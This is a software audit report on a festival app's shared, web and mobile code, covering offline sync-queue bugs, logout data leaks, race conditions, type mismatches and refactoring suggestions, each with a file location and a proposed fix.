# Tech-Debt & Hardening Audit — 2026-06-09

**Status: PARTIALLY VERIFIED + FIXED.** Output of a comprehensive multi-dimensional audit
(web / shared / mobile-iOS / mobile-Android / cross-cutting lenses). The dedup and
adversarial-verification stages could not run (session limits). **9 critical/high
findings were manually verified against the code and fixed** (see "Verified & Fixed"
below). The remaining findings should still be independently confirmed before fixing.

- Branch: `chore/tech-debt-hardening-2026-06-09` (off `master` @ `86848cd`)
- Scope audited: packages/web, packages/shared, packages/mobile (iOS + Android), workspace config. Backend (root) was out of scope except where mobile push touches `lib/notifications/send.ts`.
- Known/deferred items were excluded by design: @expo/ui segmented Picker, React Compiler, EAS Observe, @react-native-vector-icons, home-widget placeholder, flaky redis test.

## Verified & Fixed (2026-06-10)

All fixes pass typecheck (4 packages), lint (0 errors), and 1903 unit tests (702 shared + 781 web + 420 backend).

| # | Severity | Finding | File(s) changed |
|---|---|---|---|
| 1 | CRITICAL | Offline queue replay re-enters the intercepting API layer — fakes success, re-queues under new id, retry cap defeated | `shared/services/api.ts`, `shared/services/offlineQueue.ts` |
| 2 | HIGH | `failedSync` not persisted — failed writes vanish on app restart, breaking "no silent drops" | `shared/services/offlineQueue.ts` (new `FAILED_KEY` persistence + hydration) |
| 3 | HIGH | `resetAllStores` missing `failedSync`, `liveLocationStore`, and offline queue clear on logout | `shared/stores/resetStores.ts` |
| 4 | HIGH | Mobile per-card 60s `setInterval` (web already fixed with shared clock) | `mobile/hooks/useSetStatus.ts` (ported `useNow()` pattern) |
| 5 | HIGH | SOS Android notification channel missing — backend sends to `sos`, app never creates it | `mobile/hooks/useMobilePush.ts` |
| 6 | HIGH | Live-location publisher silently dies after socket reconnect | `shared/hooks/useLiveLocationPublisher.ts` (re-announce on `connect`) |
| 7 | HIGH | No FCM token-refresh listener — rotated tokens silently kill push | `mobile/hooks/useMobilePush.ts` |
| 8 | LOW | Dead `createAdminApi()` function | `shared/services/api.ts` (removed) |
| 9 | MEDIUM | `ToastProvider` context value rebuilt every render | `web/src/lib/toastContext.tsx` (useMemo) |
| 10 | LOW | `forwardRef` still used in ui/Card + IconButton after React 19 upgrade | `web/src/components/ui/Card.tsx`, `web/src/components/ui/IconButton.tsx` |

## Totals

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 22 |
| Medium | 61 |
| Low | 62 |
| **Total** | **146** |

## Suggested fix order

1. **Offline write-queue integrity** (critical/high in `packages/shared/src/services/offlineQueue.ts` + `api.ts`) — the "no silent drops" product promise is broken in several ways.
2. **Logout data-leak cluster** (`resetStores.ts`, queue replay under next user) — privacy issue on shared devices.
3. **Silent user-facing failures** (join-festival buttons, pick/reminder errors, festival switcher).
4. **Push/notification plumbing** (Android channels, FCM clickAction/token refresh, Live Activity lifecycle).
5. **Correctness bugs** (NOW-indicator date handling, stale-response races, ICS rollover, type lies).
6. **Performance** (per-card timers, ToastProvider context, expo-image adoption, virtualization).
7. **Parity/duplication refactors** (move duplicated web/mobile logic into @festie/shared).
8. **Workspace config hygiene** (eslint resolution, peer deps, TS versions, prod deps).


---

# Shared (packages/shared) — 32 findings

### [CRITICAL] drainQueue replays through the offline-intercepting api layer — a mid-drain network failure fakes success, feeds the reconciler synthetic data, and re-queues writes under new ids (retry cap defeated)

- **File:** `packages/shared/src/services/offlineQueue.ts:179`
- **Dimension:** silent-failures/queue-replay · **Effort:** small

replay() calls the same intercepted client with no bypass and no options: `case 'POST': return api.post(m.url, m.body);`. Every queued URL is offline-eligible by construction, so two paths in api.ts re-enter the queue during a drain: (1) apiRequest's network-failure catch (api.ts:378-385) does `markOffline(); return await enqueueOfflineMutation<T>(path, method, options);`, and (2) once markOffline flips offlineMode mid-drain, maybeQueueOffline (api.ts:283-286) queues every remaining replay up-front. In both cases enqueueOfflineMutation returns a synthetic `{ ...body, id: clientId, _optimistic: true }` SUCCESS to drainQueue, which then (a) removes the original entry as 'succeeded', (b) calls `_createReconciler(m.clientId, serverResponse)` with the synthetic body — the crewStore reconciler swaps the optimistic placeholder for this garbage entity with `_optimistic: false` and a temp id, so reload-dedup can no longer remove it and a duplicate appears once the real entity loads, and (c) re-enqueues the write under a NEW clientId (replay passes no options, so POSTs get `POST:${path}:${randomId()}` and custom deterministic ids like `status-<crewId>-<userId>` are lost) with `retries` reset to 0 — so MAX_RETRIES can never trip and the 'transient 5xx' bookkeeping in drainQueue is dead code for network failures. A dead-but-connected festival network mid-drain (the core product scenario) triggers this every time.

**Suggested fix:** Add an internal option (e.g. `_bypassOfflineQueue: true`) that replay() passes on every verb; in apiRequest, when set, skip both maybeQueueOffline and the catch-block enqueueOfflineMutation so a replay network failure surfaces as the status-0 ApiClientError drainQueue already classifies as transient (break/retry-count path). Also have replay() pass the original clientId/label through so any legitimate re-queue preserves identity.

### [HIGH] Queued PUT/DELETEs against temp-id URLs are never rewritten after the POST reconciles — offline edit of an offline-created entity is guaranteed to 404, and offline delete resurrects the entity

- **File:** `packages/shared/src/services/offlineQueue.ts:221`
- **Dimension:** temp-id reconciliation · **Effort:** medium

After a successful POST replay, `_createReconciler(m.clientId, serverResponse)` only fixes the in-store placeholder. Nothing rewrites later queue entries whose URL embeds the temp id. crewStore happily issues mutations against optimistic entities: e.g. `updateMeetingPoint(crewId, mpId, ...)` / `deleteMeetingPoint(crewId, mpId)` called with `mpId = 'POST:/crews/<id>/meeting-points:<uuid>'` produce queued writes to `/crews/<id>/meeting-points/POST:/crews/<id>/meeting-points:<uuid>` (the path still matches the OFFLINE_ELIGIBLE meeting-points regex, so it queues). On drain the POST creates the real entity under a server id, then the PUT/DELETE replays against the temp-id URL and 404s — a permanent 4xx, so the edit is removed and surfaced as failedSync, but the user's retry can never succeed. Worst case: create-then-delete offline → the POST still replays (recreating the item the user deleted) and the DELETE 404s, so the deleted entity resurrects on the server with only a cryptic failure notice.

**Suggested fix:** In drainQueue, after a successful POST replay extract the real server id from the response and rewrite remaining queue entries whose url (or body) contains `m.clientId` to use the real id before they replay; additionally, when a DELETE is enqueued for a temp id, cancel the matching pending POST (and the DELETE) instead of queueing both. Alternatively block edit/delete of `_optimistic` entities in the stores with a clear 'still syncing' message.

### [HIGH] failedSync lives only in the unpersisted uiStore — permanently-failed/aged-out writes vanish on app restart, breaking 'no silent drops'

- **File:** `packages/shared/src/stores/uiStore.ts:162`
- **Dimension:** persistence/silent-failures · **Effort:** small

`export const useUIStore = create<UIStore>()(uiStore);` — no persist middleware. The entire no-silent-drops contract terminates in `uiStore.failedSync` (offlineQueue.recordFailed for permanent 4xx, MAX_RETRIES exhaustion, and 24h age-out all land there, with the write removed from the durable queue first). If the app is killed or crashes before the user sees/acts on the failedSync banner — extremely likely at a festival where the app is opened in short bursts — the failed write is gone from both the persisted queue and memory: a silent drop. The 24h age-out path is the worst: readQueue() prunes on app start (`recordFailed(m, 'Expired before it could sync...'); await writeQueue(fresh);`), so the only durable copy is deleted at the exact moment the volatile notification is created.

**Suggested fix:** Persist failedSync durably: either wrap uiStore in persist with `partialize: (s) => ({ failedSync: s.failedSync })`, or have offlineQueue write failed items to their own storage key (e.g. 'festie-offline-failed') and hydrate uiStore.failedSync from it on start.

### [HIGH] shared declares an unused @tanstack/react-query peer dep, causing a duplicate react-query copy in the workspace

- **File:** `packages/shared/package.json:45`
- **Dimension:** dependencies · **Effort:** trivial

shared/package.json declares `"peerDependencies": { "@tanstack/react-query": "^5.0.0", ... }` but no file in packages/shared/src imports @tanstack/react-query (the only mention is in DATA_FLOW.md). Because the workspace has `autoInstallPeers: true` (pnpm-lock.yaml line 4), pnpm auto-installs a *separate* copy for shared resolved to 5.100.9 (lockfile importer `shared: dependencies: '@tanstack/react-query': specifier ^5.0.0, version: 5.100.9`), while web resolves its own `^5.100.14` to 5.100.14. Two distinct react-query/query-core instances now exist in the pnpm store (`@tanstack/query-core@5.100.9` and `@tanstack/query-core@5.100.14` both appear in the lockfile). If shared ever gains a react-query import, the duplicate module instance will break QueryClientProvider context resolution at runtime ('No QueryClient set').

**Suggested fix:** Delete `@tanstack/react-query` from shared's peerDependencies (it is dead), then run `pnpm install` in packages/ to drop the 5.100.9 duplicate from the lockfile. If shared is intended to gain react-query hooks later, re-add the peer at that time with a range matching web's installed version.

### [HIGH] drainQueue replays silently re-queue under a new clientId and fake success when the network dies mid-drain

- **File:** `packages/shared/src/services/api.ts:378`
- **Dimension:** offline-queue / race condition · **Effort:** small

offlineQueue.drainQueue() replays queued writes via the normal api client (`replay()` in services/offlineQueue.ts:176 calls `api.post(m.url, m.body)` with NO options). If the network fails mid-drain (the festival case), apiRequest's network-failure fallback fires: `if (!_isRetry && isMutatingMethod(method) && isOfflineEligible(path)) { markOffline(); try { return await enqueueOfflineMutation<T>(path, method, options); }` — since `options.clientId` is undefined on replay, a POST is re-enqueued under a NEW random clientId (`POST:${path}:${randomId()}`) and a PUT under the generic `${method}:${path}` instead of the caller's deterministic id (e.g. `status-<crewId>-<userId>`), breaking coalescing. Worse, enqueueOfflineMutation RESOLVES with a synthetic `{ ...body, id: newClientId, _optimistic: true }`, so drainQueue treats the replay as a SUCCESS: it deletes the original entry and calls `_createReconciler(m.clientId, serverResponse)` with the synthetic body. crewStore's reconciler then replaces the optimistic placeholder with `{ ...res, _optimistic: false }` — a fabricated, never-server-confirmed entity whose id is the new clientId and which `dropOptimistic()` can no longer clean up. If the re-queued POST later fails permanently (4xx), this ghost entity remains forever.

**Suggested fix:** Make replay() bypass the offline-capture fallback: add an internal ApiOptions flag (e.g. `skipOfflineCapture: true`) set by replay(), and skip both maybeQueueOffline and the catch-path enqueueOfflineMutation when present so a dead network throws a normal network error (drainQueue already handles transient failures by leaving the entry queued and bumping retries). Alternatively, at minimum pass `clientId: m.clientId` through replay() and have drainQueue treat a `_optimistic: true` response as a transient failure, not success.

### [HIGH] Live-location publisher never re-announces location:share after a socket reconnect — sharing silently dies

- **File:** `packages/shared/src/hooks/useLiveLocationPublisher.ts:82`
- **Dimension:** socket.io reconnect edge case · **Effort:** small

The hook emits the share intent exactly once per effect run: `socket.emit('location:share', { _v: 1, crewId }, () => {});` (line 82). The server stores the grant on per-connection state (`socket.data.sharingCrewId = crewId` — routes/socket.ts:460) and `location:update` rejects when `socket.data?.sharingCrewId !== crewId` with `NOT_SHARING` (routes/socket.ts:510-511). After any disconnect/reconnect (flaky festival connectivity), socket.io creates a fresh server-side connection with empty `socket.data`, so every subsequent `location:update` is rejected for the rest of the session. The effect deps `[socket, crewId, enabled, durationMs]` never change on reconnect (the client Socket instance is reused), no 'connect' listener is registered, and the `NOT_SHARING` error event is ignored — so the UI keeps showing "sharing" while peers see the user's marker expire.

**Suggested fix:** Inside the effect, register `socket.on('connect', handler)` that re-emits `location:share` (and re-checks `stopped`) on every reconnect while the session is active; remove the listener in `stop()`. Optionally also listen for the `NOT_SHARING` error and re-share.

### [HIGH] resetAllStores leaves persisted crew sub-data, live GPS peers/SOS, and failedSync bodies behind on logout

- **File:** `packages/shared/src/stores/resetStores.ts:25`
- **Dimension:** zustand store / logout state leak · **Effort:** small

resetAllStores() resets only `crews, activeCrew, crewMembers, crewOverlap, crewLoading, error` on crewStore — it omits the PERSISTED sub-feature read-cache: `polls, meetingPoints, packingItems, rideOffers, crewStatuses, expenses, expenseBalances, settlements, activity, _cachedAt, _cachedCrewId` (all in crewStore's `partialize`, crewStore.ts:1426-1441). After logout on a shared device, the next account still has the previous user's crew polls/expenses/meeting points on disk and in memory; if the new user opens the same crew id, `selectCrew`'s `_cachedCrewId === crewId` guard even renders them. It also never calls `useLiveLocationStore.getState().reset()` despite that store documenting `reset: ... Full reset (e.g. on logout)` (liveLocationStore.ts:65) — peers' GPS coords and any SOS stay in memory across an account switch. Finally the uiStore reset omits `failedSync: []`, so failed offline writes (including full request bodies) from the previous account remain visible and retryable by the next account.

**Suggested fix:** Extend the crewStore reset to include all persisted sub-feature fields plus `_cachedAt: null, _cachedCrewId: null`; add `useLiveLocationStore.getState().reset()`; add `failedSync: []` to the uiStore reset (and reset `_festivalCachedAt/_profilesCachedAt/_cachedFestivalId` in festivalDataStore for the same reason).

### [HIGH] CrewMember.id is typed required but the server never serializes it — kick/transfer are built on a phantom field

- **File:** `packages/shared/src/types/domain.ts:106`
- **Dimension:** types-that-lie · **Effort:** small

CrewMember declares `id: string;` (required) and `avatar?: string`, but the backend serializer (routes/crews.ts:123-131 serializeCrewWithMembers) emits only `{ userId, username, name, avatarKey, avatarVersion, role, joinedAt }` — there is no `id` and no `avatar` field at runtime, and `avatarKey`/`avatarVersion`/`joinedAt` are missing from the type. This lie has already propagated into real bugs: web crew.tsx:183 calls `kickMember(activeCrew.id, member.id)` (with a comment 'kickMember keys off the crew-membership id' written under the false belief) and mobile crew.tsx:344/360 call `kickMember(crewId, member.id)` and `transferOwnership(crewId, member.id)`. Since `member.id` is undefined at runtime, kick issues `DELETE /crews/:id/members/undefined` (server route is `/:crewId/members/:userId`, routes/crew-members.ts:152) and mobile transfer sends `{ userId: undefined }` — both 404/400. Web transfer passes `member.userId` instead, so the two apps disagree on the same store API.

**Suggested fix:** Make the type match the wire: remove `id` and `avatar` from CrewMember (or mark deprecated), add `avatarKey?: string | null`, `avatarVersion?: string | null`, `joinedAt?: string`. Change crewStore.kickMember/transferOwnership signatures to take `userId` explicitly and fix all four call sites to pass `member.userId`.

### [HIGH] resetAllStores misses liveLocationStore, crew sub-feature lists, offlineReadiness, notification prefs, and failedSync — previous account's data survives logout

- **File:** `packages/shared/src/stores/resetStores.ts:7`
- **Dimension:** store-responsibilities · **Effort:** small

resetAllStores() resets only a subset of state. It never calls `useLiveLocationStore.getState().reset()` even though liveLocationStore's own header calls GPS data 'PRIVACY-CRITICAL' and exposes `reset: ... /** Full reset (e.g. on logout). */` — grep confirms nothing in shared/web/mobile invokes it on logout, so peers' GPS positions and any SOS persist in memory across an account switch. The crewStore reset omits every persisted sub-feature list (`polls, meetingPoints, packingItems, rideOffers, crewStatuses, expenses, expenseBalances, settlements, activity, _cachedAt, _cachedCrewId`), so the previous user's crew data is re-persisted to localStorage/AsyncStorage by the persist middleware and renders for the next user on a shared device — exactly the scenario authStore.logout guards against by purging the SW 'api-cache' (authStore.ts:240-245). useNotificationPrefsStore, useOfflineReadinessStore (persisted `byFestival`), and uiStore's `failedSync` (which contains prior-user request bodies) are also never reset.

**Suggested fix:** In resetAllStores, call useLiveLocationStore.getState().reset(), add the missing crewStore fields (or give crewStore a canonical `initialState` object spread here), reset notificationPrefs to defaults with loaded:false, clear offlineReadiness.byFestival, and include failedSync: [] in the uiStore reset. Consider a per-store `reset()` action pattern so new fields can't silently escape the logout wipe.

### [MEDIUM] votePoll / removeExpense / settleExpense follow an offline-queued write with a refetch that throws — user is told the action failed though it queued; retrying settle queues a duplicate settlement

- **File:** `packages/shared/src/stores/crewStore.ts:1239`
- **Dimension:** silent-failures/UX-contract · **Effort:** small

settleExpense does `await api.post(`/crews/${crewId}/expenses/settle`, request); await useCrewStore.getState().loadExpenses(crewId);` (lines 1239-1240). Offline, the POST queues and resolves optimistically, but loadExpenses is a GET that fails → the catch sets error 'Failed to settle up' and rethrows, even though the settle is queued and WILL replay. The natural user response — tapping settle again — queues a SECOND settle POST (no deterministic clientId, so `POST:${path}:${randomId()}` never coalesces), and on reconnect the debt is reduced twice (real-money double-count). votePoll (593-594, refetch via loadPolls) and removeExpense (1226-1227, which also never removes the expense locally, so the row stays visible under a false error) have the same pattern. addExpense already solved this with its `wasOptimistic` early-return — these three were missed.

**Suggested fix:** Mirror addExpense: detect the `_optimistic` synthetic result and skip the refetch (apply a local optimistic update instead — vote upsert, expense removal). Give settleExpense a deterministic clientId (e.g. keyed on fromUserId/toUserId/amount or a caller-generated idempotency id) so repeated taps coalesce.

### [MEDIUM] Queue persistence is read-modify-write with no serialization — concurrent enqueues (or enqueue during drain) can clobber each other and silently drop a queued write

- **File:** `packages/shared/src/services/offlineQueue.ts:128`
- **Dimension:** queue-corruption/concurrency · **Effort:** small

enqueueMutation does `const queue = await readQueue(); ... await writeQueue(queue);` with an async storage round-trip between read and write, and drainQueue interleaves its own readQueue/writeQueue pairs (lines 216-217, 232-233, 241, 246-251). Two offline mutations fired in the same tick (e.g. closePoll queues the poll DELETE and then createMeetingPoint queues a POST, or two rapid taps on different resources) can both read the same snapshot; the second writeQueue overwrites the first entry — it disappears from storage with no error, no failedSync, nothing. Same race between an enqueue and drainQueue's success-removal write: the drain comment ('re-read so a concurrent enqueue ... isn't clobbered') acknowledges the hazard but re-reading only narrows the window, it doesn't close it.

**Suggested fix:** Serialize all queue storage access behind a module-level promise-chain mutex (e.g. `let _lock = Promise.resolve(); function withQueueLock<T>(fn): Promise<T> { const r = _lock.then(fn); _lock = r.catch(() => {}); return r; }`) wrapping enqueueMutation and each read-filter-write block in drainQueue.

### [MEDIUM] Storage write failure after a successful replay is misclassified as a transient request failure — the already-applied POST replays again, duplicating the write server-side

- **File:** `packages/shared/src/services/offlineQueue.ts:216`
- **Dimension:** retry/persistence-failure · **Effort:** small

In drainQueue's success path, `const queue = (await readQueue()).filter(...); await writeQueue(queue);` runs inside the same try as `await replay(m)`. If writeQueue throws (AsyncStorage failure / quota), the catch treats it like a failed request: `isPermanentFailure(err)` is false (no status) so it goes down the transient branch, bumps `retries`, and leaves the entry queued — even though the server already applied it. The next drain replays the non-idempotent POST (expense, poll, ride) a second time, creating a server-side duplicate. Worse, the transient branch's own readQueue/writeQueue (246-251) will likely also throw, escaping the loop and rejecting drainQueue — which every caller swallows (`.catch(() => {})` in api.ts:221).

**Suggested fix:** Split the try: catch only around `replay(m)`; handle queue-persistence errors separately (e.g. track successfully-replayed clientIds in memory for the pass and retry the storage write, or at minimum skip the retries-bump when the replay itself succeeded).

### [MEDIUM] Offline queue read-modify-write is not serialized — an enqueue during a drain pass can be silently dropped

- **File:** `packages/shared/src/services/offlineQueue.ts:216`
- **Dimension:** race condition in services · **Effort:** medium

Both enqueueMutation (lines 125-137: `const queue = await readQueue(); ... await writeQueue(queue)`) and every drainQueue branch (e.g. success path line 216: `const queue = (await readQueue()).filter((q) => q.clientId !== m.clientId); await writeQueue(queue);`) do an unserialized read-modify-write of the same storage key with awaits in between. On AsyncStorage these interleave: if a user write enqueues between drain's `readQueue()` and its `writeQueue()`, drain's write overwrites the queue with a snapshot that lacks the new entry — the freshly queued mutation vanishes, violating the documented "no silent drops" contract. The `_draining` flag only prevents concurrent drains, not enqueue-vs-drain interleaving (and `replay()` awaits a network call mid-loop, leaving a wide window).

**Suggested fix:** Serialize all queue storage access through a single promise-chain mutex (e.g. `let _queueLock = Promise.resolve(); function withQueueLock(fn) { const p = _queueLock.then(fn); _queueLock = p.catch(() => {}); return p; }`) wrapping every read-modify-write (enqueueMutation and each drain mutation), or restructure drain to apply removals by clientId inside the same locked section.

### [MEDIUM] votePoll / removeExpense / settleExpense surface a failure offline even though the write was queued

- **File:** `packages/shared/src/stores/crewStore.ts:590`
- **Dimension:** offline write path / unhandled optimistic result · **Effort:** small

votePoll does `await api.post(`/crews/${crewId}/polls/${pollId}/vote`, { optionIndex }); await useCrewStore.getState().loadPolls(crewId);` (lines 593-594). Offline, the POST matches OFFLINE_ELIGIBLE_PATTERNS (`/^\/crews\/[^/]+\/polls(\/|$)/` "includes /polls/:id/vote") and resolves with a synthetic optimistic result — but the unconditional `loadPolls` GET then throws a network error, so the catch runs `set({ error: message })` and rethrows: the user sees "Failed to vote" even though the vote IS queued and will replay. removeExpense (line 1227: `await useCrewStore.getState().loadExpenses(crewId)`) and settleExpense (line 1240) have the same pattern: the queued DELETE/POST resolves optimistically, the refetch throws, the UI shows "Failed to remove expense"/"Failed to settle up" and local state never reflects the queued change. addExpense already guards this case with its `wasOptimistic` early-return — these three don't.

**Suggested fix:** Mirror addExpense/updateMyStatus: check the api result for `_optimistic` (e.g. `const res = await api.post(...); if ((res as { _optimistic?: boolean })?._optimistic) { /* apply local optimistic update, skip refetch */ return; }`) and apply the vote/removal locally (applyPollVote with my user id / filter the expense out) instead of refetching.

### [MEDIUM] useFestivalStore() without a selector returns a new object from getSnapshot every call — useSyncExternalStore infinite loop

- **File:** `packages/shared/src/stores/festivalStore.ts:66`
- **Dimension:** hook correctness / incorrect memoization · **Effort:** small

The facade's no-selector fast path is `return useSyncExternalStore(subscribeToBothStores, getMergedState, getMergedState);` where `getMergedState()` returns `{ ...useFestivalDataStore.getState(), ...useFestivalUIStore.getState() }` — a brand-new object on every invocation. React's useSyncExternalStore compares consecutive getSnapshot results with Object.is and re-renders when they differ, so any component that calls `useFestivalStore()` with no selector re-renders unboundedly (React 19 throws "The result of getSnapshot should be cached to avoid an infinite loop" / "Maximum update depth exceeded"). The comment claims the path is "kept for API compatibility", but as written it is unusable — a single legacy/no-selector call site (or a future one added in good faith) crashes the screen. Separately, the same function conditionally calls hooks (`useRef`/`useCallback` only run when a selector is passed), which violates the Rules of Hooks if any call site ever toggles between forms.

**Suggested fix:** Cache the merged snapshot at module level and invalidate it from the two store subscriptions (recompute only when either store actually emits), so getSnapshot returns a stable reference between store changes; alternatively drop the no-selector overload entirely and make the selector required.

### [MEDIUM] selectFestival has no stale-response guard — a slow response for festival A can overwrite festival B after a rapid switch

- **File:** `packages/shared/src/stores/festivalDataStore.ts:213`
- **Dimension:** race condition / stale state · **Effort:** trivial

selectFestival sets `currentFestivalId: festivalId` synchronously (line 157), then awaits `api.get(`/festivals/${festivalId}`)` (with up to 2 backoff retries via withRetry, so seconds of latency) and finally calls `set({ currentFestival: festival, sets, stages, days, ... _cachedFestivalId: festivalId })` (lines 213-224) WITHOUT checking that `get().currentFestivalId === festivalId` still holds. Selecting festival A then quickly festival B lets A's late response land last, overwriting B's sets/stages/days/profiles and stamping `_cachedFestivalId: A` while `currentFestivalId` is B — the UI then shows festival A's schedule under festival B's id, and the persisted offline cache is mis-tagged. It also clobbers `useFestivalUIStore.setState({ activeStages, selectedDay })` (lines 232-235) for the wrong festival.

**Suggested fix:** After the awaits, bail out when superseded: `if (get().currentFestivalId !== festivalId) return;` before the final set() and the festivalUIStore reset (and apply the same guard in the catch so a stale failure doesn't overwrite the newer festival's error/loading state).

### [MEDIUM] selectCrew has the same stale-response race — late crew A response overwrites crew B

- **File:** `packages/shared/src/stores/crewStore.ts:282`
- **Dimension:** race condition / stale state · **Effort:** trivial

selectCrew clears state up front, then `const crew = await api.get<Crew & { members: CrewMember[] }>(`/crews/${crewId}`); set({ activeCrew: crew, crewMembers: crew.members ?? [], ... _cachedCrewId: crewId });` (lines 282-291) with no check that this crewId is still the one being opened. A rapid A→B crew switch lets A's slower response resolve last and set `activeCrew = A` / `_cachedCrewId = A` while the user is on crew B's screen — the realtime layer (`createStoreSink.stillActive`, room joins keyed on `activeCrew.id`) and the persisted read-cache then all track the wrong crew. The header comment only addresses the "stale data visible during the fetch" half, not out-of-order completion.

**Suggested fix:** Track the in-flight selection (e.g. set a module-level or state `_selectingCrewId = crewId` at entry) and discard the response if it no longer matches: `if (get()._selectingCrewId !== crewId) return;` before the success and error set() calls — or simply compare against a `_cachedCrewId`-style 'last requested' field set synchronously at the top.

### [MEDIUM] buildPicksIcs emits DTEND before DTSTART for post-midnight sets (no day rollover)

- **File:** `packages/shared/src/utils/ics.ts:126`
- **Dimension:** date/time handling · **Effort:** small

buildPicksIcs builds both timestamps from the SAME calendar day: `const dtstart = set.date.replace(/-/g, '') + 'T' + startTime.replace(':', '') + '00'; const dtend = set.date.replace(/-/g, '') + 'T' + endTime.replace(':', '') + '00';` (lines 126-127). For a set that runs past midnight (e.g. 23:30→01:00 — common headliner slot, explicitly handled everywhere else via getSetTimeBounds' rollover), DTEND lands before DTSTART, producing a negative-duration VEVENT that calendar apps reject or render as a zero/garbled event. The shared `getSetTimeBounds` (utils/setStatus.ts:149-156) already implements the "end <= start → push end to next day" rule but this exporter doesn't use it.

**Suggested fix:** When `endTime <= startTime` (compare via timeToMinutes), advance the end date by one day before formatting — e.g. reuse the addDaysToDateKey logic from setStatus.ts (export it) and build dtend from the shifted day-key.

### [MEDIUM] transferOwnership sends a userId to the server but matches members by m.id locally — local role update can never succeed

- **File:** `packages/shared/src/stores/crewStore.ts:403`
- **Dimension:** api-contract · **Effort:** trivial

transferOwnership PUTs `{ userId: newOwnerId }` (the server resolves it via `stores.crews.getMember(crewId, targetUserId)`, i.e. a USER id), but the optimistic update maps `state.crewMembers.map((m) => m.id === newOwnerId ? { ...m, role: 'owner' } : { ...m, role: 'member' })`. Because serialized members have no `id` field (see CrewMember finding) — and even per the declared type `id` is the membership id, not the user id — the match never hits, so on a successful transfer the local roster demotes EVERY member to 'member' and crowns no one until the next refetch. kickMember (line 394, `m.id !== memberId`) has the same mismatch: the filter removes nothing, leaving the kicked member visible.

**Suggested fix:** Match on `m.userId` in both transferOwnership and kickMember (and rename kickMember's param to `userId` to match the server's `/:crewId/members/:userId` route).

### [MEDIUM] Profile.picks/notes typed as required Records but arrive null at runtime; removePick crashes on a null picks map

- **File:** `packages/shared/src/types/domain.ts:97`
- **Dimension:** types-that-lie · **Effort:** small

Profile declares `picks: Record<string, Priority>;` and `notes: Record<string, string>;` as required non-null, but usePicks.ts (line ~66) documents the reality: 'API payloads have occasionally arrived as null when a profile has never had picks/notes written. Bare currentProfile.picks[setId] then throws.' The hooks defensively use `(p.picks || {})`, but the stores trust the type: festivalDataStore.removePick (line 384) does `Object.entries(currentProfile.picks)` and saveNote (line 415) spreads `...currentProfile.notes` — `Object.entries(null)` throws TypeError, so removing a pick on a never-picked profile crashes instead of no-opping. The contract lies to every new consumer, forcing tribal `|| {}` knowledge.

**Suggested fix:** Either normalize once at the fetch boundary (in selectFestival/loadProfiles map `picks: p.picks ?? {}`, `notes: p.notes ?? {}`, `reminders: p.reminders ?? {}`) and keep the strict type, or widen the type to `Record<...> | null` and let the compiler force the guards. Boundary normalization is preferable — it deletes the scattered `|| {}`.

### [MEDIUM] authStore persists its entire state (no partialize): isLoading/error/sessionChecked are written to storage and rehydrated

- **File:** `packages/shared/src/stores/authStore.ts:431`
- **Dimension:** store-contract · **Effort:** trivial

`persist(authStore, { name: 'festie-auth', storage: defaultStorage })` has no partialize, so transient flags persist. The custom PersistStorage strips only `userToken`/`adminToken` (SECURE_FIELDS); `isLoading`, `error`, and `sessionChecked` land in the blob on every set. Consequences: a write captured mid-login can rehydrate `isLoading: true`/a stale `error` on next cold start, and `sessionChecked` — whose own doc says 'Consumers that fire authenticated requests on mount should wait for this to avoid racing hydrated-from-localStorage user state against /auth/me verification' — rehydrates as `true` from the previous session, defeating the gate it exists for. Every other persisted store in the package (crewStore, festivalDataStore, festivalModeStore, offlineReadinessStore) carefully partializes; authStore is the outlier.

**Suggested fix:** Add `partialize: (s) => ({ user: s.user, userToken: s.userToken, adminToken: s.adminToken, isAdmin: s.isAdmin })` (the storage adapter then strips the tokens as today) so isLoading/error/sessionChecked always start from their initial values.

### [MEDIUM] crewStore is a 1,567-line, 10-feature store with the same optimistic-create and optimistic-merge blocks copy-pasted 5x and 3x

- **File:** `packages/shared/src/stores/crewStore.ts:671`
- **Dimension:** duplication · **Effort:** large

The optimistic-create pattern (`let optimisticX: T | null = null; const res = await api.post<{x} | (Req & {id; _optimistic})>(..., { onOptimisticCreate: (result) => { ... prepend placeholder } }); if (optimisticX) return optimisticX; const { x } = res as {x}; prepend; return x;`) is duplicated nearly verbatim in createMeetingPoint (671-710), createPackingItem (832-864), createRideOffer (959-993), createPoll (534-586), and joinByCode (336-371). The optimistic PUT-merge pattern (detect `_optimistic`, per-key camelCase→snake_case merge, fallback synthetic entity) is duplicated in updateMeetingPoint (720-792), updatePackingItem (872-921), and updateRideOffer (1001-1054) — the comments even say 'mirroring updateMeetingPoint'. On top of that, all ~30 actions repeat the identical `try { ... } catch (err) { const message = mapErrorToUserMessage(err, '...'); set({ error: message }); throw err; }` wrapper. Each new crew sub-feature is added by cloning ~80 lines, and a fix to one merge (e.g. a new server-computed field) must be hand-replicated to the other two.

**Suggested fix:** Extract generic helpers: `createOptimistic<T, Req>({ path, envelopeKey, buildPlaceholder, listKey })`, `updateOptimistic<T, Req>({ path, envelopeKey, mergeKeys: Record<reqKey, storeKey>, listKey })`, and a `withCrewError(label, fn)` wrapper. The reconciler branches (1491-1566) can also collapse into a table of `{ match, envelopeKey, listKey }`. Optionally split the store into slices (polls/logistics/expenses/status) combined into one `create()`.

### [LOW] Web queue bridge handoff drops the human-readable label — web failed-sync items surface as raw 'METHOD /path'

- **File:** `packages/shared/src/services/api.ts:159`
- **Dimension:** silent-failures/UX-contract · **Effort:** trivial

enqueueOfflineMutation computes `const label = options.offlineLabel ?? ...` but the web branch passes only `{ type: 'api', url: path, method, body, clientId }` to `window.__festieQueue.queueMutation(...)` — the label is computed and then discarded (only the native enqueueMutation receives it). Callers that set offlineLabel ('Join crew', 'Update my crew status') get no benefit on web: a permanently-failed web write can only be surfaced with the raw method+URL, which a user cannot map back to their action.

**Suggested fix:** Include `label` in the object passed to window.__festieQueue.queueMutation and plumb it through the web bridge's failed-item surfacing (extend the bridge's QueuedMutation type accordingly).

### [LOW] joinByCode online path appends the joined crew without dedup — re-joining an already-joined crew duplicates it in the list

- **File:** `packages/shared/src/stores/crewStore.ts:362`
- **Dimension:** zustand store state correctness · **Effort:** trivial

The online success branch does `set((state) => ({ crews: [...state.crews, crew], crewLoading: false }))` (lines 362-365) with no `state.crews.some((c) => c.id === crew.id)` guard. The store's own comments say the server treats re-joining an already-joined crew as idempotent and returns the same crew (lines 328-331), so tapping a crew invite link for a crew you're already in inserts a second copy of that crew into `crews` (which is also persisted via partialize). The offline reconciler for the same flow explicitly guards against this (`realAlreadyPresent`, line 1485) — the online path doesn't.

